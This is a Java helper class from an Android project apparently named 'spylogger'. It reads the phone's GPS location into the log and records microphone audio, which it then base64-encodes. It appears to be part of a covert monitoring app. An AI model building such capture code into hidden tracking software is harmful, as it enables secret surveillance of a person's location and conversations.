package com.gravatasufoca.spylogger.helpers;

import android.content.Context;
import android.util.Log;

import com.gravatasufoca.spylogger.services.GPSTracker;
import com.gravatasufoca.spylogger.utils.Utils;

import java.io.IOException;

/**
 * Created by bruno on 19/11/16.
 */

public class ServicosHelper{



    public void getLocation(Context context){
        GPSTracker gpsTracker=new GPSTracker(context);
        if(gpsTracker.canGetLocation()) {
            try {
                Thread.sleep(5000);
                Log.i("GPS LOCATION", Double.toString(gpsTracker.getLatitude())+","+Double.toString(gpsTracker.getLongitude()));
                Log.i("GPS LOCATION", Double.toString(gpsTracker.getAccuracy()));
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    public void getAudio(Context context,int maxLength){
        try {
            final MediaRecorderHelper mediaRecorderHelper=new MediaRecorderHelper(context,false,maxLength);
            TaskComplete callback=new TaskComplete() {
                @Override
                public void onFinish(Object object) {
                    String audio= Utils.encodeBase64(mediaRecorderHelper.getRecordFile());
                    audio.length();
                }
            };
            mediaRecorderHelper.setCallback(callback);

            mediaRecorderHelper.start();

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
